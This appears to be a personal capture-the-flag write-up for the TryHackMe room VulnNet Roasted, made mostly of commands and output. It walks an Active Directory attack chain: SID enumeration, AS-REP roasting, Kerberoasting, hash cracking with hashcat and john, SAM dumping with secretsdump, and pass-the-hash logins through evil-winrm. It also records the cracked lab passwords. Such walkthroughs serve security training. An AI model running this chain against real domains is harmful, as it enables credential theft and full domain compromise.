@@ -1,0 +1,282 @@
+nmap, enum4linux
+https://tryhackme.com/room/vulnnetroasted
+https://github.com/siddicky/vulnnet_roasted
+
+
+
+
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ nmap -sV -sC -Pn -v -oN nmap-report -p 53,88,135,139,389,445,464,593,636,3269 10.10.96.103
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-21 10:39:07Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+Domain Name: VULNNET-RST                                                                                            
+Domain Sid: S-1-5-21-1589833671-435344116-4136949213
+
+on smb share found info about 
+
+Alexa 
+Whitehat
+Jack 
+Goldenhand 
+Tony 
+Skid 
+Johnny 
+Leet
+
+
+
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ python3  /usr/local/bin/lookupsid.py anonymous@10.10.160.76 
+Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at 10.10.160.76
+[*] StringBinding ncacn_np:10.10.160.76[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
+498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: VULNNET-RST\Administrator (SidTypeUser)
+501: VULNNET-RST\Guest (SidTypeUser)
+502: VULNNET-RST\krbtgt (SidTypeUser)
+512: VULNNET-RST\Domain Admins (SidTypeGroup)
+513: VULNNET-RST\Domain Users (SidTypeGroup)
+514: VULNNET-RST\Domain Guests (SidTypeGroup)
+515: VULNNET-RST\Domain Computers (SidTypeGroup)
+516: VULNNET-RST\Domain Controllers (SidTypeGroup)
+517: VULNNET-RST\Cert Publishers (SidTypeAlias)
+518: VULNNET-RST\Schema Admins (SidTypeGroup)
+519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
+520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
+521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
+522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
+525: VULNNET-RST\Protected Users (SidTypeGroup)
+526: VULNNET-RST\Key Admins (SidTypeGroup)
+527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
+553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
+571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
+572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
+1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
+1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
+1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
+1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
+1105: VULNNET-RST\a-whitehat (SidTypeUser)
+1109: VULNNET-RST\t-skid (SidTypeUser)
+1110: VULNNET-RST\j-goldenhand (SidTypeUser)
+1111: VULNNET-RST\j-leet (SidTypeUser)
+
+/* Get user t-skid */
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ python3  /usr/local/bin/GetNPUsers.py VULNNET-RST/ -dc-ip 10.10.160.76 -usersfile users1 -no-pass -request 
+Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$t-skid@VULNNET-RST:cb78bb7662787dcd7614a936b6636c5d$3c12b859e02c1595aed65af29e30d0672b9369c70f099c658fdf9f5a539dac9006aa5ca23d81be46f7f653e8acde4ff3db339cb64ed8d4e09688bce62c0fd96d4ec81eb29d2c1d2b69ab04b5d08c0305acc28a2fb066f8b691c2833f2483cc6608fa1fce856b27683ac8708b39809ca81d67d45b693c30f6c36e72e0f18365064ac4907acca1f566fa8c8269246de7a0f11e97dc4e826fe934b02aede0b12cdb92264c86df7a6311a613e9fb80cd390e1faeaee9baaabe2c9a405e51bc8d113cbee3d605715a30de62f684264c46c4b6dad09b10e31f7ac11a7f14a163edef4eeacc4a1fd206ef45d62ab584a11edd40
+[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+
+/* Get user password tj072889* */               
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ hashcat -m 18200 -a 0 hash.txt /home/duke/rockyou.txt 
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=====================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-9700 CPU @ 3.00GHz, 6770/13604 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache hit:
+* Filename..: /home/duke/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5asrep$23$t-skid@VULNNET-RST:cb78bb7662787dcd7614a936b6636c5d$3c12b859e02c1595aed65af29e30d0672b9369c70f099c658fdf9f5a539dac9006aa5ca23d81be46f7f653e8acde4ff3db339cb64ed8d4e09688bce62c0fd96d4ec81eb29d2c1d2b69ab04b5d08c0305acc28a2fb066f8b691c2833f2483cc6608fa1fce856b27683ac8708b39809ca81d67d45b693c30f6c36e72e0f18365064ac4907acca1f566fa8c8269246de7a0f11e97dc4e826fe934b02aede0b12cdb92264c86df7a6311a613e9fb80cd390e1faeaee9baaabe2c9a405e51bc8d113cbee3d605715a30de62f684264c46c4b6dad09b10e31f7ac11a7f14a163edef4eeacc4a1fd206ef45d62ab584a11edd40:tj072889*
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST:cb78bb7662787dcd76...1edd40
+Time.Started.....: Thu Dec 21 06:48:15 2023 (2 secs)
+Time.Estimated...: Thu Dec 21 06:48:17 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/home/duke/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1985.0 kH/s (1.49ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 3178496/14344385 (22.16%)
+Rejected.........: 0/3178496 (0.00%)
+Restore.Point....: 3174400/14344385 (22.13%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: tk0844729759 -> tj030499
+
+Started: Thu Dec 21 06:48:00 2023
+Stopped: Thu Dec 21 06:48:18 2023
+                                                                                                                    
+/* get password by john */                                                                                                                   
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ john  --wordlist=../../rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST)     
+1g 0:00:00:01 DONE (2023-12-21 06:52) 0.5263g/s 1672Kp/s 1672Kc/s 1672KC/s tjalling..tj0216044
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ smbclient  //10.10.160.76/netlogon -W vulnnet-rst -U t-skid
+Enter VULNNET-RST\t-skid's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Mar 16 18:15:49 2021
+  ..                                  D        0  Tue Mar 16 18:15:49 2021
+  ResetPassword.vbs                   A     2821  Tue Mar 16 18:18:14 2021
+
+
+/* in vbs found other user with higher permition for smb*/  
+
+strUserNTName = "a-whitehat"
+strPassword = "bNdKVkjv3RR9ht"
+
+/* get administrator hash */
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ python3 /opt/impacket/examples/secretsdump.py VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.223.181
+Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+
+
+/* get service identity */
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile keberoast.hash -dc-ip 10.10.160.76
+Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
+----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
+CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 13:45:09.913979  2021-03-13 17:41:17.987528             
+
+
+[-] CCache file is not found. Skipping...
+                                                                                                                   
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ cat keberoast.hash   
+$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$27dfb7896dd8a06c7c06ea697abfcc8c$4086de1306e2e6fc25547b2895effac9bba0e1d34f5960033596c0f2dc2dae3b51dd881cd38350c85aa22c46181f7b187c328ad5b03a5b939958fe4b6cb67c44f2a95f0c5627a0640a9cbb0a30ecb305a6e86e7820997fb591d6f5f331004d7fca7b74c9863a3243aa66a21fe2ab6d34df02b995d909f26fc1dad8c199a29df031ead0c65f59cc1d85a160f49b6517309af9b66907a1566825d4d2ff0a8c8b6c64b84f53df48d18ab901e6ddc1111883b8c968b4b5dee5e9507682a4255d3a6cd33660651bc66d821d1ab138e1118eb227eedd1a95d3a1aaebb5a7cab4615dc720d0f55901920a31ce7fc35a006018a0ad324a1162b1e48cbd383075fddb77ce8a24612859846b84a7bbe64d1a73d20c9aa29037455b01e29b32a6d13d91e9fbc9bb454deefddcc8ba1e26ff413325f2a6cd7458a1c8d83aa6d2ad79a9db09dedc26a10dcf8dff917a6a173f22b480c32ef00cec07756191b9433879cadf8aa1a4276fe86772f7e0d1d678312df3446f6639d871fa427f82e86d397ceda6e662073aac37e5d70196d0b79f14e1fed0b8c587a44da5893c848a984419315c72d10750ffe205f214e8f332539e62f4c2a9cc544a626fbf8f867a685086917b7338b8faa72403f2bca3d0e8c2fcf25d8acb99f06593993b73b8ef735ea5fe7c1ff864ea462da2d4a1406ab28c438100b9831277bc7d2a77c36e8c16d0708c7be0bbd3e03f5bef20e06b649d46b3852fceca2c73beacc88cabe0183885fe7ed60b784b006fdfaca248e23076b50c2b50324626c22d8ec034f37de7919bc873251d70a66bfdfca2508e4eedb89cd81309ba82cf0a8a7d2c7ca76e6ed192318daef4026f01ff1f548474b510835fca88dcf6820f00062465f36a3546cff333c901c0f62205a19b4253e754f0076176fd14849b306db0773abd49a18d216ad3cf0e48655c17d42eec8c7b30a72894ee8d2d0a006ec8d239867579c5b6e78e991ae6aafcc1808bab3ead23402db061802c9b9731197b8a13831e2339ee8f96004d81f95d565a25de696714ff133545813701baff6b43c337433368200c6844d82532df894122caff1fffebddd6791d8522151119ad40ca15d00a163e38be566fc6230171be3cbc86a2c71654f430f7bfe9b461f21e69ea66dfa7d26ca38ee99e23b698bff14dfc2103e9fa295b95616c1e9e5f017a9d6078701c746a90a6af1024dea95db3f29f6bea68d0cabc25aa7158b2417493d83e41b54723120396f2448b62c07c14676243af166c939bf4727a8dd70edf1e51ab394963c84e8a93e216a146680ff8a6b9c730e8467e7ac747335e0e22f87189eff05ecfb4ce385b0acad28ecadd6f4cbcb753499c69542eb63fe4be7e939f8d9b068f33c59be876754468
+
+
+/* get service password ry=ibfkfv,s6h,*/
+
+┌──(duke㉿kali)-[~/Documents/THM_VulNet_Roasted]
+└─$ hashcat -m 13100 keberoast.hash ../../rockyou.txt 
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=====================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-9700 CPU @ 3.00GHz, 6770/13604 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache hit:
+* Filename..: ../../rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$27dfb7896dd8a06c7c06ea697abfcc8c$4086de1306e2e6fc25547b2895effac9bba0e1d34f5960033596c0f2dc2dae3b51dd881cd38350c85aa22c46181f7b187c328ad5b03a5b939958fe4b6cb67c44f2a95f0c5627a0640a9cbb0a30ecb305a6e86e7820997fb591d6f5f331004d7fca7b74c9863a3243aa66a21fe2ab6d34df02b995d909f26fc1dad8c199a29df031ead0c65f59cc1d85a160f49b6517309af9b66907a1566825d4d2ff0a8c8b6c64b84f53df48d18ab901e6ddc1111883b8c968b4b5dee5e9507682a4255d3a6cd33660651bc66d821d1ab138e1118eb227eedd1a95d3a1aaebb5a7cab4615dc720d0f55901920a31ce7fc35a006018a0ad324a1162b1e48cbd383075fddb77ce8a24612859846b84a7bbe64d1a73d20c9aa29037455b01e29b32a6d13d91e9fbc9bb454deefddcc8ba1e26ff413325f2a6cd7458a1c8d83aa6d2ad79a9db09dedc26a10dcf8dff917a6a173f22b480c32ef00cec07756191b9433879cadf8aa1a4276fe86772f7e0d1d678312df3446f6639d871fa427f82e86d397ceda6e662073aac37e5d70196d0b79f14e1fed0b8c587a44da5893c848a984419315c72d10750ffe205f214e8f332539e62f4c2a9cc544a626fbf8f867a685086917b7338b8faa72403f2bca3d0e8c2fcf25d8acb99f06593993b73b8ef735ea5fe7c1ff864ea462da2d4a1406ab28c438100b9831277bc7d2a77c36e8c16d0708c7be0bbd3e03f5bef20e06b649d46b3852fceca2c73beacc88cabe0183885fe7ed60b784b006fdfaca248e23076b50c2b50324626c22d8ec034f37de7919bc873251d70a66bfdfca2508e4eedb89cd81309ba82cf0a8a7d2c7ca76e6ed192318daef4026f01ff1f548474b510835fca88dcf6820f00062465f36a3546cff333c901c0f62205a19b4253e754f0076176fd14849b306db0773abd49a18d216ad3cf0e48655c17d42eec8c7b30a72894ee8d2d0a006ec8d239867579c5b6e78e991ae6aafcc1808bab3ead23402db061802c9b9731197b8a13831e2339ee8f96004d81f95d565a25de696714ff133545813701baff6b43c337433368200c6844d82532df894122caff1fffebddd6791d8522151119ad40ca15d00a163e38be566fc6230171be3cbc86a2c71654f430f7bfe9b461f21e69ea66dfa7d26ca38ee99e23b698bff14dfc2103e9fa295b95616c1e9e5f017a9d6078701c746a90a6af1024dea95db3f29f6bea68d0cabc25aa7158b2417493d83e41b54723120396f2448b62c07c14676243af166c939bf4727a8dd70edf1e51ab394963c84e8a93e216a146680ff8a6b9c730e8467e7ac747335e0e22f87189eff05ecfb4ce385b0acad28ecadd6f4cbcb753499c69542eb63fe4be7e939f8d9b068f33c59be876754468:ry=ibfkfv,s6h,
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$V...754468
+Time.Started.....: Thu Dec 21 07:09:40 2023 (2 secs)
+Time.Estimated...: Thu Dec 21 07:09:42 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (../../rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1949.2 kH/s (1.52ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 4112384/14344385 (28.67%)
+Rejected.........: 0/4112384 (0.00%)
+Restore.Point....: 4108288/14344385 (28.64%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: ry=iu0if] -> rutie12
+
+Started: Thu Dec 21 07:09:40 2023
+Stopped: Thu Dec 21 07:09:44 2023
+                                    
+
+/* get remote access */
+evil-winrm -i 10.10.223.181 -u enterprise-core-vn -p ry=ibfkfv,s6h,
+evil-winrm -i 10.10.223.181 -u administrator -H c2597747aa5e43022a3a3049a3c3b09d 
